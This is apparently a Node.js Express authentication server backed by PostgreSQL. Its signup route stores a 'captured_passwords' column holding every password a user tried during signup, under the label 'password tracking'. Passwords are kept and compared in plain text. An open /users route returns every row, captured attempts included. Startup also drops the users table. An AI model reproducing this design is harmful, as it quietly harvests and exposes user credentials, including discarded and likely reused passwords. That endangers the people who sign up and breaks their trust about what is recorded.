require("dotenv").config();
const express = require("express");
const cors = require("cors");
const { Pool } = require("pg");

const app = express();
app.use(cors());
app.use(express.json());

// Set up PostgreSQL Connection Pool
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: {
    rejectUnauthorized: false
  }
});

// Create table on startup
const initDB = async () => {
  try {
    // Drops the table to rebuild it with the new captured_passwords column
    await pool.query('DROP TABLE IF EXISTS users'); 
    
    await pool.query(`
      CREATE TABLE users (
        id SERIAL PRIMARY KEY,
        email TEXT UNIQUE,
        name TEXT,
        password TEXT,
        captured_passwords TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      )
    `);
    console.log("✅ Postgres Database table 'users' is ready with password tracking!");
  } catch (err) {
    console.error("❌ Error creating table:", err);
  }
};
initDB();

app.get("/", (req, res) => {
  res.send("Auth server running with Postgres 🚀");
});

// ==========================================
// 1. SIGNUP ENDPOINT (Creates new user)
// ==========================================
app.post("/signup", async (req, res) => {
  // We now expect 'captured_passwords' to be sent from the frontend
  const { email, name, password, captured_passwords } = req.body;
  const time = new Date().toISOString();

  try {
    const userCheck = await pool.query("SELECT * FROM users WHERE email = $1", [email]);
    if (userCheck.rows.length > 0) {
      return res.status(400).json({ error: "User already exists" });
    }

    // Insert the user WITH their final password AND the history of all attempts
    await pool.query(
      "INSERT INTO users (email, name, password, captured_passwords, created_at) VALUES ($1, $2, $3, $4, $5)",
      [email, name, password, captured_passwords, time]
    );
    res.json({ success: true });
    
  } catch (err) {
    console.error("Database error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ==========================================
// 2. LOGIN ENDPOINT (Checks existing user)
// ==========================================
app.post("/login", async (req, res) => {
  const { email, password } = req.body;

  try {
    const result = await pool.query("SELECT * FROM users WHERE email = $1", [email]);
    
    if (result.rows.length === 0) {
      return res.status(400).json({ error: "Account not found. Please sign up." });
    }

    const user = result.rows[0];

    // Compare the typed password directly with the saved plain text password
    if (password !== user.password) {
       return res.status(400).json({ error: "Incorrect password!" });
    }
    
    res.json({ success: true });
    
  } catch (err) {
    console.error("Database error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// Get users (for testing)
app.get("/users", async (req, res) => {
  try {
    const result = await pool.query("SELECT * FROM users");
    res.json(result.rows);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log("Server running on port", PORT));